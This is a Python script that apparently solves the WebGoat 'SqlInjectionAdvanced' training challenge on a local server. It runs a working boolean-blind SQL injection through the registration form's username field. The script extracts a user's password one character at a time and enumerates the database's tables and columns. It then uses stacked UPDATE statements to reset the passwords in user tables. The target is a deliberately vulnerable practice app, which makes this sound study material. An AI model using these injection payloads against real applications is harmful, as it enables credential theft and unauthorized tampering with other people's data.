#!usr/bin/env python3

import requests

letters = ['A','B','C','D','E','F','G','H','I','J','K',
	   'L','M','N','O','P','Q','R','S','T','U','V',
 	   'W','X','Y','Z','_','a','b','c','d','e','f',
	   'g','h','i','j','k','l','m','n','o','p','q',
	   'r','s','t','u','v','w','x','y','z']


def bruteForcePassword():
	password = ""
	i=1
	find = False
	while True:
		for letter in letters:
			payload = f"tom' AND SUBSTRING(password,{i},1)='{letter}';--"
			response = putRequest(payload)
			if 'created' not in response['feedback'] and response['output'] is None:
				find = True
				password += letter
		if find == True:
			find = False
			i += 1
		else:
			break
	return password


def putRequest(query):
	url = 'http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge'
	headers = {'Cookie':'JSESSIONID=6yYaOht75TvX5P86BnehogF1slDEiyggutpn7KT4'}
	data = {
		"username_reg": query,
		"email_reg": "test@test.com",
		"password_reg": "t",
		"confirm_password_reg": "t"
	}
	req = requests.put(url, headers=headers, data=data)
	out = req.json()
	return out


def findDBversion():#db version=2
	number = 0
	for i in range(11):
		payload = f"tom' AND SUBSTRING(database_version(),1,1)={i};--"
		response = putRequest(payload)
		if 'created' not in response['feedback'] and response['output'] is None:
			number = i
			return number


def findNumberOfBaseTables(maxNum):#TOTAL TABLES=121, BASE TABLE=24, VIEW=97
	number = 0
	for n in range(maxNum):
		payload = f"tom' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE')={n};--"
		response = putRequest(payload)
		if 'created' not in response['feedback'] and response['output'] is None:
			number = n
			return number


def findTables(numTables):
	tables = []
	find = False
	for num in range(numTables):
		nameTable = ""
		i = 1
		while True:
			for letter in letters:
				temp = nameTable + letter
				payload = f"tom' AND SUBSTRING((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' LIMIT 1 OFFSET {num}),1,{i})='{temp}';--"
				response = putRequest(payload)
				if 'created' not in response['feedback'] and response['output'] is None:
					find = True
					nameTable += letter
					break
			if find == True:
				find = False
				i += 1
			else:
				break
		tables.append(nameTable)
	return tables
	#tables = ['BL0CKS', 'LOBS', 'PARTS', 'LOB_IDS', 'flyway_schema_history', 'CHALLENGE_USERS', 'JWT_KEYS', 'SERVERS', 'USER_DATA', 'SALARIES', 'USER_DATA_TAN', 					     		           'SQL_CHALLENGE_USERS', 'USER_SYSTEM_DATA', 'EMPLOYEES', 'ACCESS_LOG', 'flyway_schema_history', 'ASSIGNMENT', 'LESSON_TRACKER',  'LESSON_TRACKER_ALL_ASSIGNMENTS',         			   'LESSON_TRACKER_SOLVED_ASSIGNMENTS', 'USER_TRACKER', 'USER_TRACKER_LESSON_TRACKERS', 'WEB_GOAT_USER', 'EMAIL']


def filterTables(tables, fil):
	newTables = []
	for table in tables:
		if fil in table:
			newTables.append(table)
	return newTables


def findColumn(table):
	columns = []
	findField = False
	offset = 0
	while True:
		findLetter = False
		nameColumn = ""
		i = 1
		while True:
			for letter in letters:
				temp = nameColumn + letter
				payload = f"tom' AND SUBSTRING((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{table}' LIMIT 1 OFFSET {offset}),1,{i})='{temp}';--"
				response = putRequest(payload)
				if 'created' not in response['feedback'] and response['output'] is None:
					findLetter = True
					nameColumn += letter
					break
			if findLetter == True:
				findLetter = False
				i += 1
				findField = True
			else:
				break
		if findField == True:
			print(nameColumn)
			columns.append(nameColumn)
			findField = False
			offset += 1
		else:
			break
	return columns

def findAllColumns(tables):
	tablesAndColumns = {}
	for table in tables:
		columns = findColumn(table)
		tablesAndColumns[table] = columns
	return tablesAndColumns


def findColumnInTables(tablesAndColumns, columnToLookFor):
	tab = []
	for tables,columns in tablesAndColumns.items():
		for column in columns:
			if column == columnToLookFor:
				tab.append(tables)
	return tab


def findNumberColumns(tab, maxColumn):
	column = 0
	for n in range(maxColumn):
		payload = f"tom' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{tab}')={n};--"
		response = putRequest(payload)
		if 'created' not in response['feedback'] and response['output'] is None:
			column = n
			return column


def checkPasswordColumns(tables):
	tableWithPassword = []
	for table in tables:
		offset = findNumberColumns(table, 10)
		print('Check for table: ' + str(table) + ' with ' + str(offset) + ' columns')
		for off in range(offset):
			payload = f"tom' AND ((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{table}' LIMIT 1 OFFSET {off})='PASSWORD');--"
			response = putRequest(payload)
			if 'created' not in response['feedback'] and response['output'] is None:
				tableWithPassword.append(table)
				break
	return tableWithPassword
					

def updateTables(tables, password):
	for table in tables:
		payload = f"tom';UPDATE {table} SET PASSWORD='{password}';--"
		putRequest(payload)	


def main():
	#findDBversion()
	#findNumberOfBaseTables(122)
	
	#####FIRST SOLUTION#####
	#bruteForcePassword()
	
	#####SECOND SOLUTION ENUMERATING ALL COLUMNS OF ALL TABLES#####
	#tables = findTables(24)
	#newTables = filterTables(tables, 'USER')
	#tablesAndColumns = findAllColumns(newTables)
	#tablePasswordColumn = findColumnInTables(tablesAndColumns, 'PASSWORD')
	#updateTables(tablePasswordColumn, 'new')
	
	#####SECOND SOLUTION CHECKING THE COLUMN PASSWORD#####		
	tables = findTables(24)
	newTables = filterTables(tables, 'USER')
	tableToUpdate = checkPasswordColumns(newTables)
	updateTables(tableToUpdate, 'new')
	

if __name__ == '__main__':
	main()

